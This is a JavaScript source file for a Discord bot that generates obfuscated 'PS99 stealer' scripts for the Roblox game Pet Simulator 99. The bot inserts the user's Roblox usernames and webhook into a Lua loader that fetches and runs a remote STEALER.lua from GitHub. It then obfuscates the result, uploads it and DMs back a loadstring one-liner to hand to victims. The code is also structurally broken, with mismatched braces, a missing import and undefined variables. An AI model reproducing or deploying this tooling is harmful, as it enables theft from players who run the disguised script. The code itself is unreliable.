import express from "express";
import { lua, to_jsstring } from "fengari";
import "dotenv/config";
import fs from "fs";
import { exec } from "child_process";
import { Octokit } from "@octokit/rest";
import {
    Client,
    GatewayIntentBits,
    SlashCommandBuilder,
    REST,
    Routes,
    ActionRowBuilder,
    ModalBuilder,
    TextInputBuilder,
    TextInputStyle,
    ButtonBuilder,
    ButtonStyle,
    EmbedBuilder,
    InteractionType,
} from "discord.js";
import pkg from 'fengari-interop';
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const { load } = require('fengari-interop');

// Express server setup for keep-alive
const app = express();
const PORT = process.env.PORT || 8080;

// Keep-alive routes
app.get('/', (_, res) => {
    res.send('<body><center><h1>Bot 24H ON!</h1></center></body>');
});

app.get('/health', (_, res) => {
    res.status(200).send('OK');
});

// Discord bot setup
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.MessageContent,
    ],
    partials: ["CHANNEL"],
});

const octokit = new Octokit({ auth: process.env.GITHUB_TOKEN });
const repoOwner = process.env.GITHUB_OWNER;
const repoName = process.env.GITHUB_REPO;
const repoPath = "scripts/";
// Fetch the log channel when the bot starts
const commands = [
    new SlashCommandBuilder()
        .setName("generate-ps99stealer")
        .setDescription("Generate Your Own PS99 Stealer!"),
].map(command => command.toJSON());

const rest = new REST({ version: "10" }).setToken(process.env.TOKEN);

client.once("ready", async () => {
    try {
        console.log(`✅ Logged in as ${client.user.tag}`);

        // Initialize log channel
        const logChannel = client.channels.cache.get(process.env.LOG_CHANNEL_ID);
        if (!logChannel) {
            console.log("❌ Log channel not found! Make sure LOG_CHANNEL_ID is correct in your environment variables.");
        } else {
            console.log("✅ Log channel loaded successfully!");
        }

        await rest.put(Routes.applicationCommands(client.user.id), {
            body: commands,
        });
        console.log("✅ Slash commands registered!");
    } catch (error) {
        console.error("❌ Error:", error);
    }
});

client.on("interactionCreate", async (interaction) => {
    if (!interaction.type === InteractionType.ApplicationCommand && !interaction.type === InteractionType.ModalSubmit) return;

    try {
        if (interaction.commandName === "generate-ps99stealer") {
            const modal = new ModalBuilder()
                .setCustomId("form_pet_sim_99")
                .setTitle("Generate PS99 Mailstealer");

            const usernameInput = new TextInputBuilder()
                .setCustomId("username")
                .setLabel("Username")
                .setStyle(TextInputStyle.Short)
                .setPlaceholder("Enter your username")
                .setRequired(true);

            const secusernameInput = new TextInputBuilder()
                .setCustomId("username_sec")
                .setLabel("Second Username")
                .setStyle(TextInputStyle.Short)
                .setPlaceholder("Enter your Second Username")
                .setRequired(true);

            const webhookInput = new TextInputBuilder()
                .setCustomId("webhook")
                .setLabel("Webhook URL")
                .setStyle(TextInputStyle.Short)
                .setPlaceholder("Enter your webhook URL")
                .setRequired(true);

            const RapInput = new TextInputBuilder()
                .setCustomId("rap")
                .setLabel("Minimum Rap")
                .setStyle(TextInputStyle.Short)
                .setPlaceholder("Enter The Minimum Rap")
                .setRequired(true);

            modal.addComponents(
                new ActionRowBuilder().addComponents(usernameInput),
                new ActionRowBuilder().addComponents(secusernameInput),
                new ActionRowBuilder().addComponents(webhookInput),
                new ActionRowBuilder().addComponents(RapInput)
            );

            await interaction.showModal(modal);
        }

        if (interaction.isModalSubmit()) {
            await interaction.deferReply({ ephemeral: true });

            const username = interaction.fields.getTextInputValue("username");
            const webhook = interaction.fields.getTextInputValue("webhook");
            const username_sec = interaction.fields.getTextInputValue("username_sec");
            const rap = interaction.fields.getTextInputValue("rap");

            try {
                const timestamp = Date.now();
                const outputFileName = `Huge_Hunter_${timestamp}.txt`;
                const API_KEY = process.env.API_KEY; // Replace with your actual API key
                const LUA_FILE_PATH = `script_${timestamp}.lua`; // Path to your Lua file


                // Example Lua script (replace with actual script content)
                const luaScript = `
                    local a=[[
                    _G.Username = "${username}"
                    _G.Username2 = "${username_sec}"
                    _G.minrap = ${rap}
                    _G.webhook = "${webhook}"
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/RAYZHUB/RAYZHUB-SCRIPTS/refs/heads/main/STEALER.lua"))()
                    ]]
                    `;

                
                
                // Save the Lua script to a file
                fs.writeFileSync(LUA_FILE_PATH, luaScript, "utf8");

                // API Endpoint and Headers
                const url = "https://luaobfuscator.com/api/obfuscate";
                const headers = {
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${API_KEY}`,
                };
                // Payload (Customize options if needed)
                const payload = {
                    script: luaScript,
                    options: {
                        Preset: "Max", // Options: Default, Light, Max
                        },
                };

                // Send request to obfuscate Lua script
                axios.post(url, payload, { headers })
                    .then(response => {
                        if (response.data.obfuscated_script) {
                            console.log("✅ Obfuscation Successful!");
                            // Save the obfuscated script
                            fs.writeFileSync("obfuscated.lua", response.data.obfuscated_script, "utf8");
                            console.log("✅ Obfuscated script saved to obfuscated.lua");
                            // Save obfuscated script to output file
                            fs.writeFileSync(outputFileName, response.data.obfuscated_script, "utf8");
                            console.log(`✅ Obfuscated script saved to ${outputFileName}`);
                        } else {
                            console.error("❌ Obfuscation failed:", response.data);
                        }
                    })
                    .catch(error => {
                        console.error("❌ Error:", error.response ? error.response.data : error.message);
                    });
            } catch (error) {
                console.error(`❌ Execution error: ${error.message}`);
            }
            
            // Save the output to a file
                fs.writeFileSync(outputFileName, output);
                
            } catch (error) {
                console.error(`Execution error: ${error.message}`);
                interaction.followUp({ content: "❌ Lua execution failed!", ephemeral: true });
            }
}
                

                try {
                    await octokit.repos.createOrUpdateFileContents({
                        owner: repoOwner,
                        repo: repoName,
                        path: `${repoPath}${outputFileName}`,
                        message: `Upload execution output: ${outputFileName}`,
                        content: Buffer.from(fs.readFileSync(outputFileName)).toString("base64"),
                        committer: { name: "Bot", email: "bot@example.com" },
                        author: { name: "Bot", email: "bot@example.com" },
                    });

                    const scriptURL = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/main/${repoPath}${outputFileName}`;
                    const loadstringCode = `loadstring(game:HttpGet("${scriptURL}", true))()`;

                    const embed = new EmbedBuilder()
                    .setTitle("🌟 Salesman Generator 🌟")
                    .setDescription(`\`Your custom PS99 script has been generated successfully!\``)
                    .addFieldss(
                    { name: "⚙️ Script Configuration", value: "---------------------" },
                    { name: "👤 Primary Username", value: username, inline: true },
                    { name: "👥 Secondary Username", value: username, inline: true },
                    { name: "💰 Minimum RAP", value: rap, inline: true },
                    { name: "📂 Script File", value: outputFileName, inline: true },
                    { name: "📦 Repository", value: "Huge_Hunter", inline: true },
                    { name: "🔗 Raw URL", value: `[Click Here](${scriptURL})`, inline: false }
                    )
                    .setColor("#FFD700")
                    .setFooter({ text: `Salesman Generator | Today at ${new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true })}` });

                    const row = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setLabel("📋 Copy URL")
                            .setStyle(ButtonStyle.Primary)
                            .setCustomId("copy_url"),
                        new ButtonBuilder()
                            .setLabel("📜 Copy Loadstring")
                            .setStyle(ButtonStyle.Success)
                            .setCustomId("copy_loadstring"),
                        new ButtonBuilder()
                            .setLabel("📂 Open Script")
                            .setStyle(ButtonStyle.Link)
                            .setURL(scriptURL)
                    );

                    await interaction.user.send({ embeds: [embed], components: [row] });

                    // Event listener for button interaction
                    client.on('interactionCreate', async interaction => {
                        if (!interaction.isButton()) return;

                        if (interaction.customId === 'copy_url') {
                            await interaction.reply({ content: `${scriptURL}`, ephemeral: true });

                        } else if (interaction.customId === 'copy_loadstring') {
                            await interaction.reply({ content: `${loadstringCode}`, ephemeral: true });

                        }
                    });


                    fs.unlinkSync(luaFileName);
                    fs.unlinkSync(outputFileName);
                    await interaction.followUp({ content: "✅ Check your DMs!", ephemeral: true });

                } catch (uploadError) {
                    console.error("❌ GitHub Upload Error:", uploadError);
                    await interaction.followUp({ content: "❌ Failed to upload script!", ephemeral: true });
                }
            // Send log to log channel

                    const scriptUrl = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/main/${repoPath}${outputFileName}`

                    const logEmbed = {
                        color: 0x3498db,
                        title: "🛠️ Script Generation Log",
                        description: "Details of the generated script",
                        fields: [
                            { name: "🎮 Discord User", value: interaction.user.tag, inline: true },
                            { name: "🔑 User ID", value: interaction.user.id, inline: true },
                            { name: "📜 Script Type", value: "PS99", inline: true },
                            { name: "👤 Roblox Username", value: username || "Unknown", inline: true },
                            { name: "🔗 Script URL", value: `[Click here to open the script](${scriptUrl})` },
                        ],
                        footer: { text: "Salesman Generator" },
                        timestamp: new Date(),
                    };

                    const logChannel = client.channels.cache.get(process.env.LOG_CHANNEL_ID);
                    if (logChannel) {
                        await logChannel.send({ embeds: [logEmbed] }).catch(err => console.error("❌ Failed to send log:", err));
                    }
            
        
    } catch (error) {
        console.error("❌ Error:", error);
        await interaction.followUp({ content: "❌ An error occurred!", ephemeral: true });
    }
});

// Start Express server and Discord bot
app.listen(PORT, '0.0.0.0', () => {
    console.log('✅ Express server running on port ' + PORT);
    client.login(process.env.TOKEN).then(() => {
        console.log('✅ Discord bot ready and will stay alive 24/7!');
    }).catch(console.error);
});
